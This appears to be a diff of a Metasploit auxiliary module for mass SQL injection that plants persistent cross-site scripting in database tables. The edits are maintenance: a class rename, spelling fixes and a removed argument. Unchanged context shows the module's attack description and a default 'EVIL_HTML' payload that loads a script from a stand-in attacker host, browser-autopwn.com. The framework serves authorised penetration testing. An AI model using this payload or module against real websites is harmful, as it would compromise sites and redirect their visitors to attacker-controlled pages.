@@ -1,15 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::WmapModule
@@ -20,8 +16,8 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'HTTP Microsoft SQL Injection Table XSS Infection',
       'Description'    => %q{
         This module implements the mass SQL injection attack in
-        use lately by concatenation of HTML string that forces a persistant
-        XSS attack to redirect user browser to a attacker controller website.
+        use lately by concatenation of HTML string that forces a persistent
+        XSS attack to redirect user browser to an attacker controller website.
       },
       'Author'         => [ 'et' ],
       'License'        => BSD_LICENSE))
@@ -34,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
         OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
         OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
         OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']),
-      ], self.class)
+      ])
 
   end
 
@@ -92,5 +88,4 @@ EOF
   print_status("Request sent.")
 
   end
-
 end
